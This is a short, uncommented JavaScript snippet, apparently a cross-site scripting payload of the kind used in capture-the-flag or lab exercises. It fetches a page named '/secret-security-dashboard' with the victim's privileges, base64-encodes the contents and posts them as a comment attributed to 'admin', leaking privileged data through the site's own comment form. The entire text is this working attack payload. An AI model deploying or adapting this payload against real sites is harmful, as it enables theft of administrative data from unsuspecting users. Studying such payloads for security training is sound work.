fetch("/secret-security-dashboard")
  .then(response => response.text()) 
  .then(adminData => {
    const postData = new URLSearchParams({
      comment2: btoa(adminData), 
      "comment-author": "admin"
    });
    return fetch("/post-comment", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: postData,
    });
  });